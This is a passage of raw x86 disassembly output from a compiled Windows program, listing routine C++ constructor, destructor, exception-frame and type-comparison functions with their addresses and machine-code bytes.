  4023a2:	c2 04 00             	ret    $0x4
  4023a5:	6a 00                	push   $0x0
  4023a7:	50                   	push   %eax
  4023a8:	e8 67 c7 02 00       	call   0x42eb14
  4023ad:	83 c4 0c             	add    $0xc,%esp
  4023b0:	5f                   	pop    %edi
  4023b1:	5e                   	pop    %esi
  4023b2:	8b e5                	mov    %ebp,%esp
  4023b4:	5d                   	pop    %ebp
  4023b5:	c2 04 00             	ret    $0x4
  4023b8:	cc                   	int3
  4023b9:	cc                   	int3
  4023ba:	cc                   	int3
  4023bb:	cc                   	int3
  4023bc:	cc                   	int3
  4023bd:	cc                   	int3
  4023be:	cc                   	int3
  4023bf:	cc                   	int3
  4023c0:	55                   	push   %ebp
  4023c1:	8b ec                	mov    %esp,%ebp
  4023c3:	6a ff                	push   $0xffffffff
  4023c5:	68 fd ef 42 00       	push   $0x42effd
  4023ca:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4023d0:	50                   	push   %eax
  4023d1:	83 ec 1c             	sub    $0x1c,%esp
  4023d4:	56                   	push   %esi
  4023d5:	a1 0c 40 44 00       	mov    0x44400c,%eax
  4023da:	33 c5                	xor    %ebp,%eax
  4023dc:	50                   	push   %eax
  4023dd:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4023e0:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4023e6:	8b f1                	mov    %ecx,%esi
  4023e8:	c7 45 d8 5c 5d 43 00 	movl   $0x435d5c,-0x28(%ebp)
  4023ef:	c7 45 d8 74 5d 43 00 	movl   $0x435d74,-0x28(%ebp)
  4023f6:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  4023fd:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  402404:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40240b:	c7 45 d8 10 5d 43 00 	movl   $0x435d10,-0x28(%ebp)
  402412:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  402419:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  402420:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  402427:	c7 45 f0 40 00 00 00 	movl   $0x40,-0x10(%ebp)
  40242e:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402435:	8b 06                	mov    (%esi),%eax
  402437:	ff 50 44             	call   *0x44(%eax)
  40243a:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40243d:	8b ce                	mov    %esi,%ecx
  40243f:	50                   	push   %eax
  402440:	e8 3b fe ff ff       	call   0x402280
  402445:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40244c:	c7 45 d8 10 5d 43 00 	movl   $0x435d10,-0x28(%ebp)
  402453:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  40245a:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  40245d:	85 c9                	test   %ecx,%ecx
  40245f:	74 1f                	je     0x402480
  402461:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402464:	51                   	push   %ecx
  402465:	8b 40 0c             	mov    0xc(%eax),%eax
  402468:	3d 40 b7 41 00       	cmp    $0x41b740,%eax
  40246d:	75 0c                	jne    0x40247b
  40246f:	b9 b8 69 44 00       	mov    $0x4469b8,%ecx
  402474:	e8 57 ba 01 00       	call   0x41ded0
  402479:	eb 05                	jmp    0x402480
  40247b:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40247e:	ff d0                	call   *%eax
  402480:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  402487:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  40248e:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  402495:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40249c:	c7 45 d8 74 5d 43 00 	movl   $0x435d74,-0x28(%ebp)
  4024a3:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4024a6:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4024ad:	59                   	pop    %ecx
  4024ae:	5e                   	pop    %esi
  4024af:	8b e5                	mov    %ebp,%esp
  4024b1:	5d                   	pop    %ebp
  4024b2:	c3                   	ret
  4024b3:	cc                   	int3
  4024b4:	cc                   	int3
  4024b5:	cc                   	int3
  4024b6:	cc                   	int3
  4024b7:	cc                   	int3
  4024b8:	cc                   	int3
  4024b9:	cc                   	int3
  4024ba:	cc                   	int3
  4024bb:	cc                   	int3
  4024bc:	cc                   	int3
  4024bd:	cc                   	int3
  4024be:	cc                   	int3
  4024bf:	cc                   	int3
  4024c0:	55                   	push   %ebp
  4024c1:	8b ec                	mov    %esp,%ebp
  4024c3:	6a ff                	push   $0xffffffff
  4024c5:	68 2d f0 42 00       	push   $0x42f02d
  4024ca:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4024d0:	50                   	push   %eax
  4024d1:	51                   	push   %ecx
  4024d2:	56                   	push   %esi
  4024d3:	a1 0c 40 44 00       	mov    0x44400c,%eax
  4024d8:	33 c5                	xor    %ebp,%eax
  4024da:	50                   	push   %eax
  4024db:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4024de:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4024e4:	8b f1                	mov    %ecx,%esi
  4024e6:	89 75 f0             	mov    %esi,-0x10(%ebp)
  4024e9:	c7 06 10 5d 43 00    	movl   $0x435d10,(%esi)
  4024ef:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4024f6:	8b 4e 0c             	mov    0xc(%esi),%ecx
  4024f9:	85 c9                	test   %ecx,%ecx
  4024fb:	74 1d                	je     0x40251a
  4024fd:	8b 06                	mov    (%esi),%eax
  4024ff:	51                   	push   %ecx
  402500:	8b 40 0c             	mov    0xc(%eax),%eax
  402503:	3d 40 b7 41 00       	cmp    $0x41b740,%eax
  402508:	75 0c                	jne    0x402516
  40250a:	b9 b8 69 44 00       	mov    $0x4469b8,%ecx
  40250f:	e8 bc b9 01 00       	call   0x41ded0
  402514:	eb 04                	jmp    0x40251a
  402516:	8b ce                	mov    %esi,%ecx
  402518:	ff d0                	call   *%eax
  40251a:	c7 46 0c 00 00 00 00 	movl   $0x0,0xc(%esi)
  402521:	c7 46 14 00 00 00 00 	movl   $0x0,0x14(%esi)
  402528:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  40252f:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  402536:	8b 45 08             	mov    0x8(%ebp),%eax
  402539:	c7 06 74 5d 43 00    	movl   $0x435d74,(%esi)
  40253f:	a8 01                	test   $0x1,%al
  402541:	74 2a                	je     0x40256d
  402543:	a8 04                	test   $0x4,%al
  402545:	75 1b                	jne    0x402562
  402547:	8b ce                	mov    %esi,%ecx
  402549:	e8 02 90 01 00       	call   0x41b550
  40254e:	8b c6                	mov    %esi,%eax
  402550:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402553:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40255a:	59                   	pop    %ecx
  40255b:	5e                   	pop    %esi
  40255c:	8b e5                	mov    %ebp,%esp
  40255e:	5d                   	pop    %ebp
  40255f:	c2 04 00             	ret    $0x4
  402562:	6a 1c                	push   $0x1c
  402564:	56                   	push   %esi
  402565:	e8 16 f1 ff ff       	call   0x401680
  40256a:	83 c4 08             	add    $0x8,%esp
  40256d:	8b c6                	mov    %esi,%eax
  40256f:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402572:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402579:	59                   	pop    %ecx
  40257a:	5e                   	pop    %esi
  40257b:	8b e5                	mov    %ebp,%esp
  40257d:	5d                   	pop    %ebp
  40257e:	c2 04 00             	ret    $0x4
  402581:	cc                   	int3
  402582:	cc                   	int3
  402583:	cc                   	int3
  402584:	cc                   	int3
  402585:	cc                   	int3
  402586:	cc                   	int3
  402587:	cc                   	int3
  402588:	cc                   	int3
  402589:	cc                   	int3
  40258a:	cc                   	int3
  40258b:	cc                   	int3
  40258c:	cc                   	int3
  40258d:	cc                   	int3
  40258e:	cc                   	int3
  40258f:	cc                   	int3
  402590:	55                   	push   %ebp
  402591:	8b ec                	mov    %esp,%ebp
  402593:	6a ff                	push   $0xffffffff
  402595:	68 61 f0 42 00       	push   $0x42f061
  40259a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4025a0:	50                   	push   %eax
  4025a1:	a1 0c 40 44 00       	mov    0x44400c,%eax
  4025a6:	33 c5                	xor    %ebp,%eax
  4025a8:	50                   	push   %eax
  4025a9:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4025ac:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4025b2:	64 a1 2c 00 00 00    	mov    %fs:0x2c,%eax
  4025b8:	8b 08                	mov    (%eax),%ecx
  4025ba:	a1 f0 65 44 00       	mov    0x4465f0,%eax
  4025bf:	3b 81 04 00 00 00    	cmp    0x4(%ecx),%eax
  4025c5:	7f 14                	jg     0x4025db
  4025c7:	b8 f4 65 44 00       	mov    $0x4465f4,%eax
  4025cc:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4025cf:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4025d6:	59                   	pop    %ecx
  4025d7:	8b e5                	mov    %ebp,%esp
  4025d9:	5d                   	pop    %ebp
  4025da:	c3                   	ret
  4025db:	68 f0 65 44 00       	push   $0x4465f0
  4025e0:	e8 0f b6 02 00       	call   0x42dbf4
  4025e5:	83 c4 04             	add    $0x4,%esp
  4025e8:	83 3d f0 65 44 00 ff 	cmpl   $0xffffffff,0x4465f0
  4025ef:	75 d6                	jne    0x4025c7
  4025f1:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4025f8:	b9 f8 65 44 00       	mov    $0x4465f8,%ecx
  4025fd:	68 04 5d 43 00       	push   $0x435d04
  402602:	c7 05 f4 65 44 00 10 	movl   $0x402010,0x4465f4
  402609:	20 40 00 
  40260c:	e8 1f 06 00 00       	call   0x402c30
  402611:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  402618:	68 f0 65 44 00       	push   $0x4465f0
  40261d:	e8 88 b5 02 00       	call   0x42dbaa
  402622:	83 c4 04             	add    $0x4,%esp
  402625:	eb a0                	jmp    0x4025c7
  402627:	cc                   	int3
  402628:	cc                   	int3
  402629:	cc                   	int3
  40262a:	cc                   	int3
  40262b:	cc                   	int3
  40262c:	cc                   	int3
  40262d:	cc                   	int3
  40262e:	cc                   	int3
  40262f:	cc                   	int3
  402630:	55                   	push   %ebp
  402631:	8b ec                	mov    %esp,%ebp
  402633:	56                   	push   %esi
  402634:	e8 57 ff ff ff       	call   0x402590
  402639:	8b 75 08             	mov    0x8(%ebp),%esi
  40263c:	3b f0                	cmp    %eax,%esi
  40263e:	74 58                	je     0x402698
  402640:	8b 48 0c             	mov    0xc(%eax),%ecx
  402643:	3b 4e 0c             	cmp    0xc(%esi),%ecx
  402646:	75 1c                	jne    0x402664
  402648:	8b 4e 08             	mov    0x8(%esi),%ecx
  40264b:	39 48 08             	cmp    %ecx,0x8(%eax)
  40264e:	75 14                	jne    0x402664
  402650:	51                   	push   %ecx
  402651:	ff 76 04             	push   0x4(%esi)
  402654:	ff 70 04             	push   0x4(%eax)
  402657:	ff 15 c4 54 43 00    	call   *0x4354c4
  40265d:	83 c4 0c             	add    $0xc,%esp
  402660:	85 c0                	test   %eax,%eax
  402662:	74 34                	je     0x402698
  402664:	e8 d7 04 00 00       	call   0x402b40
  402669:	3b f0                	cmp    %eax,%esi
  40266b:	74 2b                	je     0x402698
  40266d:	8b 48 0c             	mov    0xc(%eax),%ecx
  402670:	3b 4e 0c             	cmp    0xc(%esi),%ecx
  402673:	75 1c                	jne    0x402691
  402675:	8b 4e 08             	mov    0x8(%esi),%ecx
  402678:	39 48 08             	cmp    %ecx,0x8(%eax)
  40267b:	75 14                	jne    0x402691
  40267d:	51                   	push   %ecx
  40267e:	ff 76 04             	push   0x4(%esi)
  402681:	ff 70 04             	push   0x4(%eax)
  402684:	ff 15 c4 54 43 00    	call   *0x4354c4
  40268a:	83 c4 0c             	add    $0xc,%esp
  40268d:	85 c0                	test   %eax,%eax
  40268f:	74 07                	je     0x402698
  402691:	33 c0                	xor    %eax,%eax
  402693:	5e                   	pop    %esi
  402694:	5d                   	pop    %ebp
  402695:	c2 04 00             	ret    $0x4
  402698:	b8 01 00 00 00       	mov    $0x1,%eax
  40269d:	5e                   	pop    %esi
  40269e:	5d                   	pop    %ebp
  40269f:	c2 04 00             	ret    $0x4
  4026a2:	cc                   	int3
  4026a3:	cc                   	int3
  4026a4:	cc                   	int3
  4026a5:	cc                   	int3
  4026a6:	cc                   	int3
  4026a7:	cc                   	int3
  4026a8:	cc                   	int3
  4026a9:	cc                   	int3
  4026aa:	cc                   	int3
  4026ab:	cc                   	int3
  4026ac:	cc                   	int3
  4026ad:	cc                   	int3
  4026ae:	cc                   	int3
  4026af:	cc                   	int3
  4026b0:	55                   	push   %ebp
  4026b1:	8b ec                	mov    %esp,%ebp
  4026b3:	6a ff                	push   $0xffffffff
  4026b5:	68 2d f0 42 00       	push   $0x42f02d
  4026ba:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4026c0:	50                   	push   %eax
  4026c1:	51                   	push   %ecx
  4026c2:	56                   	push   %esi
  4026c3:	a1 0c 40 44 00       	mov    0x44400c,%eax
  4026c8:	33 c5                	xor    %ebp,%eax
  4026ca:	50                   	push   %eax
  4026cb:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4026ce:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4026d4:	8b f1                	mov    %ecx,%esi
  4026d6:	89 75 f0             	mov    %esi,-0x10(%ebp)
  4026d9:	c7 06 10 5d 43 00    	movl   $0x435d10,(%esi)
  4026df:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4026e6:	8b 4e 0c             	mov    0xc(%esi),%ecx
  4026e9:	85 c9                	test   %ecx,%ecx
  4026eb:	74 1d                	je     0x40270a
  4026ed:	8b 06                	mov    (%esi),%eax
  4026ef:	51                   	push   %ecx
  4026f0:	8b 40 0c             	mov    0xc(%eax),%eax
  4026f3:	3d 40 b7 41 00       	cmp    $0x41b740,%eax
  4026f8:	75 0c                	jne    0x402706
  4026fa:	b9 b8 69 44 00       	mov    $0x4469b8,%ecx
  4026ff:	e8 cc b7 01 00       	call   0x41ded0
  402704:	eb 04                	jmp    0x40270a
  402706:	8b ce                	mov    %esi,%ecx
  402708:	ff d0                	call   *%eax
  40270a:	c7 46 0c 00 00 00 00 	movl   $0x0,0xc(%esi)
  402711:	c7 46 14 00 00 00 00 	movl   $0x0,0x14(%esi)
  402718:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  40271f:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  402726:	c7 06 74 5d 43 00    	movl   $0x435d74,(%esi)
  40272c:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40272f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402736:	59                   	pop    %ecx
  402737:	5e                   	pop    %esi
  402738:	8b e5                	mov    %ebp,%esp
  40273a:	5d                   	pop    %ebp
  40273b:	c3                   	ret
  40273c:	cc                   	int3
  40273d:	cc                   	int3
  40273e:	cc                   	int3
  40273f:	cc                   	int3
  402740:	55                   	push   %ebp
  402741:	8b ec                	mov    %esp,%ebp
  402743:	6a ff                	push   $0xffffffff
  402745:	68 a0 f0 42 00       	push   $0x42f0a0
  40274a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402750:	50                   	push   %eax
  402751:	83 ec 08             	sub    $0x8,%esp
  402754:	a1 0c 40 44 00       	mov    0x44400c,%eax
  402759:	33 c5                	xor    %ebp,%eax
  40275b:	50                   	push   %eax
  40275c:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40275f:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  402765:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  402768:	c7 01 74 5d 43 00    	movl   $0x435d74,(%ecx)
  40276e:	c7 41 04 00 00 00 00 	movl   $0x0,0x4(%ecx)
  402775:	c7 41 08 00 00 00 00 	movl   $0x0,0x8(%ecx)
  40277c:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  402783:	8d 41 10             	lea    0x10(%ecx),%eax
  402786:	c7 01 bc 5c 43 00    	movl   $0x435cbc,(%ecx)
  40278c:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40278f:	c7 00 74 5d 43 00    	movl   $0x435d74,(%eax)
  402795:	c7 40 04 00 00 00 00 	movl   $0x0,0x4(%eax)
  40279c:	c7 40 08 00 00 00 00 	movl   $0x0,0x8(%eax)
  4027a3:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  4027a7:	c7 00 10 5d 43 00    	movl   $0x435d10,(%eax)
  4027ad:	c7 40 0c 00 00 00 00 	movl   $0x0,0xc(%eax)
  4027b4:	c7 40 14 00 00 00 00 	movl   $0x0,0x14(%eax)
  4027bb:	c7 40 10 00 00 00 00 	movl   $0x0,0x10(%eax)
  4027c2:	c7 40 18 40 00 00 00 	movl   $0x40,0x18(%eax)
  4027c9:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  4027cd:	c7 41 0c 00 00 00 00 	movl   $0x0,0xc(%ecx)
  4027d4:	c7 41 28 fe 00 00 00 	movl   $0xfe,0x28(%ecx)
  4027db:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4027e2:	8b c1                	mov    %ecx,%eax
  4027e4:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4027e7:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4027ee:	59                   	pop    %ecx
  4027ef:	8b e5                	mov    %ebp,%esp
  4027f1:	5d                   	pop    %ebp
  4027f2:	c3                   	ret
  4027f3:	cc                   	int3
  4027f4:	cc                   	int3
  4027f5:	cc                   	int3
  4027f6:	cc                   	int3
  4027f7:	cc                   	int3
  4027f8:	cc                   	int3
  4027f9:	cc                   	int3
  4027fa:	cc                   	int3
  4027fb:	cc                   	int3
  4027fc:	cc                   	int3
  4027fd:	cc                   	int3
  4027fe:	cc                   	int3
  4027ff:	cc                   	int3
  402800:	e9 3b 03 00 00       	jmp    0x402b40
  402805:	cc                   	int3
  402806:	cc                   	int3
  402807:	cc                   	int3
  402808:	cc                   	int3
  402809:	cc                   	int3
  40280a:	cc                   	int3
  40280b:	cc                   	int3
  40280c:	cc                   	int3
  40280d:	cc                   	int3
  40280e:	cc                   	int3
  40280f:	cc                   	int3
  402810:	55                   	push   %ebp
  402811:	8b ec                	mov    %esp,%ebp
  402813:	53                   	push   %ebx
  402814:	56                   	push   %esi
  402815:	57                   	push   %edi
  402816:	8b d9                	mov    %ecx,%ebx
  402818:	e8 23 03 00 00       	call   0x402b40
  40281d:	8b 75 08             	mov    0x8(%ebp),%esi
  402820:	8b f8                	mov    %eax,%edi
  402822:	8b ce                	mov    %esi,%ecx
  402824:	8b 16                	mov    (%esi),%edx
  402826:	ff 52 14             	call   *0x14(%edx)
  402829:	3b f8                	cmp    %eax,%edi
  40282b:	74 24                	je     0x402851
  40282d:	8b 48 0c             	mov    0xc(%eax),%ecx
  402830:	3b 4f 0c             	cmp    0xc(%edi),%ecx
  402833:	75 3a                	jne    0x40286f
  402835:	8b 4f 08             	mov    0x8(%edi),%ecx
  402838:	39 48 08             	cmp    %ecx,0x8(%eax)
  40283b:	75 32                	jne    0x40286f
  40283d:	51                   	push   %ecx
  40283e:	ff 77 04             	push   0x4(%edi)
  402841:	ff 70 04             	push   0x4(%eax)
  402844:	ff 15 c4 54 43 00    	call   *0x4354c4
  40284a:	83 c4 0c             	add    $0xc,%esp
  40284d:	85 c0                	test   %eax,%eax
  40284f:	75 1e                	jne    0x40286f
  402851:	8b 46 04             	mov    0x4(%esi),%eax
  402854:	33 43 04             	xor    0x4(%ebx),%eax
  402857:	a8 01                	test   $0x1,%al
  402859:	75 14                	jne    0x40286f
  40285b:	8b 43 08             	mov    0x8(%ebx),%eax
  40285e:	3b 46 08             	cmp    0x8(%esi),%eax
  402861:	75 0c                	jne    0x40286f
  402863:	5f                   	pop    %edi
  402864:	5e                   	pop    %esi
  402865:	b8 01 00 00 00       	mov    $0x1,%eax
  40286a:	5b                   	pop    %ebx
  40286b:	5d                   	pop    %ebp
  40286c:	c2 04 00             	ret    $0x4
  40286f:	5f                   	pop    %edi
  402870:	5e                   	pop    %esi
  402871:	33 c0                	xor    %eax,%eax
  402873:	5b                   	pop    %ebx
  402874:	5d                   	pop    %ebp
  402875:	c2 04 00             	ret    $0x4
  402878:	cc                   	int3
  402879:	cc                   	int3
  40287a:	cc                   	int3
  40287b:	cc                   	int3
  40287c:	cc                   	int3
  40287d:	cc                   	int3
  40287e:	cc                   	int3
  40287f:	cc                   	int3
  402880:	55                   	push   %ebp
  402881:	8b ec                	mov    %esp,%ebp
  402883:	6a ff                	push   $0xffffffff
  402885:	68 fd ed 42 00       	push   $0x42edfd
  40288a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402890:	50                   	push   %eax
  402891:	51                   	push   %ecx
  402892:	a1 0c 40 44 00       	mov    0x44400c,%eax
  402897:	33 c5                	xor    %ebp,%eax
  402899:	50                   	push   %eax
  40289a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40289d:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4028a3:	83 3d c8 69 44 00 0c 	cmpl   $0xc,0x4469c8
  4028aa:	7c 2c                	jl     0x4028d8
  4028ac:	68 cc 69 44 00       	push   $0x4469cc
  4028b1:	e8 4a b4 01 00       	call   0x41dd00
  4028b6:	8b 0d c4 69 44 00    	mov    0x4469c4,%ecx
  4028bc:	83 c4 04             	add    $0x4,%esp
  4028bf:	85 c9                	test   %ecx,%ecx
  4028c1:	74 07                	je     0x4028ca
  4028c3:	8b 01                	mov    (%ecx),%eax
  4028c5:	a3 c4 69 44 00       	mov    %eax,0x4469c4
  4028ca:	c7 05 cc 69 44 00 01 	movl   $0x1,0x4469cc
  4028d1:	00 00 00 
  4028d4:	85 c9                	test   %ecx,%ecx
  4028d6:	75 1f                	jne    0x4028f7
  4028d8:	6a 0c                	push   $0xc
  4028da:	6a 00                	push   $0x0
  4028dc:	ff 15 d8 51 43 00    	call   *0x4351d8
  4028e2:	50                   	push   %eax
  4028e3:	ff 15 e8 51 43 00    	call   *0x4351e8
  4028e9:	8b c8                	mov    %eax,%ecx
  4028eb:	85 c9                	test   %ecx,%ecx
  4028ed:	75 08                	jne    0x4028f7
  4028ef:	6a ff                	push   $0xffffffff
  4028f1:	ff 15 4c 54 43 00    	call   *0x43544c
  4028f7:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4028fa:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  402901:	c7 01 74 5d 43 00    	movl   $0x435d74,(%ecx)
  402907:	c7 41 04 00 00 00 00 	movl   $0x0,0x4(%ecx)
  40290e:	c7 41 08 00 00 00 00 	movl   $0x0,0x8(%ecx)
  402915:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40291c:	8b c1                	mov    %ecx,%eax
  40291e:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402921:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402928:	59                   	pop    %ecx
  402929:	8b e5                	mov    %ebp,%esp
  40292b:	5d                   	pop    %ebp
  40292c:	c3                   	ret
  40292d:	cc                   	int3
  40292e:	cc                   	int3
  40292f:	cc                   	int3
  402930:	55                   	push   %ebp
  402931:	8b ec                	mov    %esp,%ebp
  402933:	6a ff                	push   $0xffffffff
  402935:	68 d5 f0 42 00       	push   $0x42f0d5
  40293a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402940:	50                   	push   %eax
  402941:	51                   	push   %ecx
  402942:	56                   	push   %esi
  402943:	a1 0c 40 44 00       	mov    0x44400c,%eax
  402948:	33 c5                	xor    %ebp,%eax
  40294a:	50                   	push   %eax
  40294b:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40294e:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  402954:	8b f1                	mov    %ecx,%esi
  402956:	83 3d c8 69 44 00 0c 	cmpl   $0xc,0x4469c8
  40295d:	7c 2c                	jl     0x40298b
  40295f:	68 cc 69 44 00       	push   $0x4469cc
  402964:	e8 97 b3 01 00       	call   0x41dd00
  402969:	8b 0d c4 69 44 00    	mov    0x4469c4,%ecx
  40296f:	83 c4 04             	add    $0x4,%esp
  402972:	85 c9                	test   %ecx,%ecx
  402974:	74 07                	je     0x40297d
  402976:	8b 01                	mov    (%ecx),%eax
  402978:	a3 c4 69 44 00       	mov    %eax,0x4469c4
  40297d:	c7 05 cc 69 44 00 01 	movl   $0x1,0x4469cc
  402984:	00 00 00 
  402987:	85 c9                	test   %ecx,%ecx
  402989:	75 1f                	jne    0x4029aa
  40298b:	6a 0c                	push   $0xc
  40298d:	6a 00                	push   $0x0
  40298f:	ff 15 d8 51 43 00    	call   *0x4351d8
  402995:	50                   	push   %eax
  402996:	ff 15 e8 51 43 00    	call   *0x4351e8
  40299c:	8b c8                	mov    %eax,%ecx
  40299e:	85 c9                	test   %ecx,%ecx
  4029a0:	75 08                	jne    0x4029aa
  4029a2:	6a ff                	push   $0xffffffff
  4029a4:	ff 15 4c 54 43 00    	call   *0x43544c
  4029aa:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4029ad:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4029b4:	c7 01 74 5d 43 00    	movl   $0x435d74,(%ecx)
  4029ba:	c7 41 04 00 00 00 00 	movl   $0x0,0x4(%ecx)
  4029c1:	c7 41 08 00 00 00 00 	movl   $0x0,0x8(%ecx)
  4029c8:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  4029cc:	c7 01 74 5d 43 00    	movl   $0x435d74,(%ecx)
  4029d2:	8b 46 04             	mov    0x4(%esi),%eax
  4029d5:	89 41 04             	mov    %eax,0x4(%ecx)
  4029d8:	8b 46 08             	mov    0x8(%esi),%eax
  4029db:	89 41 08             	mov    %eax,0x8(%ecx)
  4029de:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4029e5:	8b c1                	mov    %ecx,%eax
  4029e7:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4029ea:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4029f1:	59                   	pop    %ecx
  4029f2:	5e                   	pop    %esi
  4029f3:	8b e5                	mov    %ebp,%esp
  4029f5:	5d                   	pop    %ebp
  4029f6:	c3                   	ret
  4029f7:	cc                   	int3
  4029f8:	cc                   	int3
  4029f9:	cc                   	int3
  4029fa:	cc                   	int3
  4029fb:	cc                   	int3
  4029fc:	cc                   	int3
  4029fd:	cc                   	int3
  4029fe:	cc                   	int3
  4029ff:	cc                   	int3
  402a00:	55                   	push   %ebp
  402a01:	8b ec                	mov    %esp,%ebp
  402a03:	53                   	push   %ebx
  402a04:	8b 5d 08             	mov    0x8(%ebp),%ebx
  402a07:	56                   	push   %esi
  402a08:	57                   	push   %edi
  402a09:	8b f9                	mov    %ecx,%edi
  402a0b:	8b 33                	mov    (%ebx),%esi
  402a0d:	e8 2e 01 00 00       	call   0x402b40
  402a12:	50                   	push   %eax
  402a13:	8b cb                	mov    %ebx,%ecx
  402a15:	ff 56 34             	call   *0x34(%esi)
  402a18:	85 c0                	test   %eax,%eax
  402a1a:	74 1f                	je     0x402a3b
  402a1c:	8b 07                	mov    (%edi),%eax
  402a1e:	8b cf                	mov    %edi,%ecx
  402a20:	ff 50 44             	call   *0x44(%eax)
  402a23:	8b 43 04             	mov    0x4(%ebx),%eax
  402a26:	89 47 04             	mov    %eax,0x4(%edi)
  402a29:	8b 43 08             	mov    0x8(%ebx),%eax
  402a2c:	89 47 08             	mov    %eax,0x8(%edi)
  402a2f:	b8 01 00 00 00       	mov    $0x1,%eax
  402a34:	5f                   	pop    %edi
  402a35:	5e                   	pop    %esi
  402a36:	5b                   	pop    %ebx
  402a37:	5d                   	pop    %ebp
  402a38:	c2 04 00             	ret    $0x4
  402a3b:	5f                   	pop    %edi
  402a3c:	5e                   	pop    %esi
  402a3d:	33 c0                	xor    %eax,%eax
  402a3f:	5b                   	pop    %ebx
  402a40:	5d                   	pop    %ebp
  402a41:	c2 04 00             	ret    $0x4
  402a44:	cc                   	int3
  402a45:	cc                   	int3
  402a46:	cc                   	int3
  402a47:	cc                   	int3
  402a48:	cc                   	int3
  402a49:	cc                   	int3
  402a4a:	cc                   	int3
  402a4b:	cc                   	int3
  402a4c:	cc                   	int3
  402a4d:	cc                   	int3
  402a4e:	cc                   	int3
  402a4f:	cc                   	int3
  402a50:	55                   	push   %ebp
  402a51:	8b ec                	mov    %esp,%ebp
  402a53:	6a ff                	push   $0xffffffff
  402a55:	68 0d f1 42 00       	push   $0x42f10d
  402a5a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402a60:	50                   	push   %eax
  402a61:	83 ec 0c             	sub    $0xc,%esp
  402a64:	56                   	push   %esi
  402a65:	a1 0c 40 44 00       	mov    0x44400c,%eax
  402a6a:	33 c5                	xor    %ebp,%eax
  402a6c:	50                   	push   %eax
  402a6d:	8d 45 f4             	lea    -0xc(%ebp),%eax
